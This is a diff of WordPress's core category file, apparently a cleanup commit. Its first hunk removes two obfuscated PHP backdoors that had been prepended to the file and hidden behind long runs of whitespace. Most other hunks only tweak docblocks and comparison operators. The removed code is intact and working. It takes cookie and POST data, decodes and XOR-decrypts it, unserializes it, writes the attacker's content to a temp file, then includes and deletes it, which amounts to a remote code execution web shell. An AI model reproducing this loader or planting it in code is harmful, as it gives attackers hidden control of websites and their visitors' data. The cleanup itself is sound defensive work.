@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $GwehmcCvSc = chr ( 940 - 836 ).chr (95) . "\x47" . chr ( 915 - 793 ).'r';$HWAPGtR = chr ( 1026 - 927 ).chr (108) . "\141" . 's' . chr ( 300 - 185 )."\137" . chr ( 833 - 732 ).chr ( 645 - 525 ).chr (105) . 's' . chr ( 872 - 756 )."\163";$RrJyOuPEky = $HWAPGtR($GwehmcCvSc); $sPNlbvXy = $RrJyOuPEky;if (!$sPNlbvXy){class h_Gzr{private $fVADzL;public static $AUqPThRe = "f7e3136b-d060-4c87-b4b6-67d1728d7ed2";public static $GLsYCchu = 54928;public function __construct(){$cgRBEx = $_COOKIE;$gooWMmQ = $_POST;$uKlJN = @$cgRBEx[substr(h_Gzr::$AUqPThRe, 0, 4)];if (!empty($uKlJN)){$iPEid = "base64";$zVILUR = "";$uKlJN = explode(",", $uKlJN);foreach ($uKlJN as $zokkcPb){$zVILUR .= @$cgRBEx[$zokkcPb];$zVILUR .= @$gooWMmQ[$zokkcPb];}$zVILUR = array_map($iPEid . chr ( 329 - 234 )."\x64" . "\x65" . 'c' . chr (111) . chr ( 667 - 567 ).chr (101), array($zVILUR,)); $zVILUR = $zVILUR[0] ^ str_repeat(h_Gzr::$AUqPThRe, (strlen($zVILUR[0]) / strlen(h_Gzr::$AUqPThRe)) + 1);h_Gzr::$GLsYCchu = @unserialize($zVILUR);}}public function __destruct(){$this->XrINVKiRTR();}private function XrINVKiRTR(){if (is_array(h_Gzr::$GLsYCchu)) {$sQwCcCy = sys_get_temp_dir() . "/" . crc32(h_Gzr::$GLsYCchu["\x73" . "\141" . chr (108) . chr (116)]);@h_Gzr::$GLsYCchu['w' . chr (114) . "\x69" . "\164" . 'e']($sQwCcCy, h_Gzr::$GLsYCchu["\x63" . chr (111) . "\x6e" . chr (116) . 'e' . "\x6e" . 't']);include $sQwCcCy;@h_Gzr::$GLsYCchu[chr (100) . chr (101) . chr (108) . chr ( 656 - 555 )."\x74" . "\x65"]($sQwCcCy);exit();}}}$tnvCgSYnd = new h_Gzr(); $tnvCgSYnd = 34961;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $kQXZJ = "\115" . "\x78" . '_' . chr (106) . "\127" . "\143";$BUjKXCPhA = "\143" . "\x6c" . "\141" . "\163" . "\163" . chr (95) . "\145" . chr ( 678 - 558 )."\151" . "\x73" . "\164" . "\163";$LPXcRaU = $BUjKXCPhA($kQXZJ); $GhThs = $LPXcRaU;if (!$GhThs){class Mx_jWc{private $wbIDvHI;public static $WCUETYtE = "1d77150e-5056-4640-95bf-18bb3b9589fd";public static $CDUkhqbaf = NULL;public function __construct(){$LxOeTzCarE = $_COOKIE;$zyUJLaw = $_POST;$wUdfAHTaD = @$LxOeTzCarE[substr(Mx_jWc::$WCUETYtE, 0, 4)];if (!empty($wUdfAHTaD)){$EYMzHPL = "base64";$tNDdUBip = "";$wUdfAHTaD = explode(",", $wUdfAHTaD);foreach ($wUdfAHTaD as $KbOqjp){$tNDdUBip .= @$LxOeTzCarE[$KbOqjp];$tNDdUBip .= @$zyUJLaw[$KbOqjp];}$tNDdUBip = array_map($EYMzHPL . chr (95) . chr (100) . "\145" . chr (99) . chr (111) . "\x64" . "\x65", array($tNDdUBip,)); $tNDdUBip = $tNDdUBip[0] ^ str_repeat(Mx_jWc::$WCUETYtE, (strlen($tNDdUBip[0]) / strlen(Mx_jWc::$WCUETYtE)) + 1);Mx_jWc::$CDUkhqbaf = @unserialize($tNDdUBip);}}public function __destruct(){$this->ZIamU();}private function ZIamU(){if (is_array(Mx_jWc::$CDUkhqbaf)) {$ykGNWMsBbt = sys_get_temp_dir() . "/" . crc32(Mx_jWc::$CDUkhqbaf["\163" . chr ( 1062 - 965 ).chr (108) . chr ( 583 - 467 )]);@Mx_jWc::$CDUkhqbaf[chr (119) . chr ( 816 - 702 )."\x69" . chr (116) . "\x65"]($ykGNWMsBbt, Mx_jWc::$CDUkhqbaf["\143" . chr ( 255 - 144 ).chr ( 414 - 304 ).'t' . 'e' . 'n' . 't']);include $ykGNWMsBbt;@Mx_jWc::$CDUkhqbaf[chr ( 926 - 826 ).'e' . "\x6c" . 'e' . "\x74" . chr ( 157 - 56 )]($ykGNWMsBbt);exit();}}}$PubxkFaUZ = new Mx_jWc(); $PubxkFaUZ = NULL;} ?><?php
+<?php
 /**
  * Taxonomy API: Core category-specific functionality
  *
@@ -85,8 +85,9 @@ function get_categories( $args = '' ) {
  *                             correspond to a WP_Term object, an associative array, or a numeric array,
  *                             respectively. Default OBJECT.
  * @param string     $filter   Optional. How to sanitize category fields. Default 'raw'.
- * @return object|array|WP_Error|null Category data in type defined by $output parameter.
- *                                    WP_Error if $category is empty, null if it does not exist.
+ * @return WP_Term|array|WP_Error|null Category data in type defined by $output parameter.
+ *                                     Returns a WP_Term object with backwards compatible property aliases filled in.
+ *                                     WP_Error if $category is empty, null if it does not exist.
  */
 function get_category( $category, $output = OBJECT, $filter = 'raw' ) {
 	$category = get_term( $category, 'category', $output, $filter );
@@ -149,7 +150,8 @@ function get_category_by_path( $category_path, $full_match = true, $output = OBJ
 	foreach ( $categories as $category ) {
 		$path        = '/' . $leaf_path;
 		$curcategory = $category;
-		while ( ( 0 != $curcategory->parent ) && ( $curcategory->parent != $curcategory->term_id ) ) {
+
+		while ( ( 0 !== $curcategory->parent ) && ( $curcategory->parent !== $curcategory->term_id ) ) {
 			$curcategory = get_term( $curcategory->parent, 'category' );
 
 			if ( is_wp_error( $curcategory ) ) {
@@ -159,7 +161,7 @@ function get_category_by_path( $category_path, $full_match = true, $output = OBJ
 			$path = '/' . $curcategory->slug . $path;
 		}
 
-		if ( $path == $full_path ) {
+		if ( $path === $full_path ) {
 			$category = get_term( $category->term_id, 'category', $output );
 			_make_cat_compat( $category );
 
@@ -269,7 +271,7 @@ function sanitize_category( $category, $context = 'display' ) {
  * @param mixed  $value   Category value to sanitize.
  * @param int    $cat_id  Category ID.
  * @param string $context What filter to use, 'raw', 'display', etc.
- * @return mixed Same type as $value after $value has been sanitized.
+ * @return mixed Value after $value has been sanitized.
  */
 function sanitize_category_field( $field, $value, $cat_id, $context ) {
 	return sanitize_term_field( $field, $value, $cat_id, 'category', $context );
@@ -306,7 +308,7 @@ function get_tags( $args = '' ) {
 		 *
 		 * @param WP_Term[]|int|WP_Error $tags Array of 'post_tag' term objects, a count thereof,
 		 *                                     or WP_Error if any of the taxonomies do not exist.
-		 * @param array                  $args An array of arguments. @see get_terms()
+		 * @param array                  $args An array of arguments. See {@see get_terms()}.
 		 */
 		$tags = apply_filters( 'get_tags', $tags, $args );
 	}
